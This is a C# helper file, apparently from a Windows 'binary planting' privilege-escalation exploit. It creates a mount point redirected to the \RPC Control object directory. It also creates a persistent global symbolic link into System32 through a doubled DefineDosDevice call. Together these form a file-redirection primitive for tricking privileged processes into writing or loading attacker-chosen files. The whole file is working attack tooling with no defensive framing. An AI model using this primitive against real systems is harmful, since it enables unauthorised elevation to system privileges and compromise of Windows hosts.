using System;
using System.Runtime.InteropServices;
using NtApiDotNet;

namespace BinaryPlanting
{
    class Utils
    {
        [DllImport("kernel32", EntryPoint = "DefineDosDevice", SetLastError = true)]
        private static extern bool DefineDosDevice(
            uint dwFlags,
            string lpDeviceName,
            string lpTargetPath);

        private const uint DDD_RAW_TARGET_PATH       = 0x00000001;
        private const uint DDD_NO_BROADCAST_SYSTEM   = 0x00000008;

        private static string ObjectDirectory = @"\RPC Control";

        static public void MakeMountPoint(string mountpoint)
        {
            
            string mountDirectoryNt = NtFileUtils.DosFileNameToNt(mountpoint);

            NtFile.CreateMountPoint(mountDirectoryNt, ObjectDirectory, "");
        }

        static public bool MakePermanentSymLink(string symlink, string target)
        {
            string system32 = Environment.SystemDirectory;
            uint flags = DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH;

            if (DefineDosDevice(flags, $@"Global\GLOBALROOT{ObjectDirectory}\{symlink}", $@"\??\{system32}\{target}") &&
                DefineDosDevice(flags, $@"Global\GLOBALROOT{ObjectDirectory}\{symlink}", $@"\??\{system32}\{target}"))
                return true;

            Console.WriteLine("[-] Error creating symlink");

            return false;
        }
    }
}
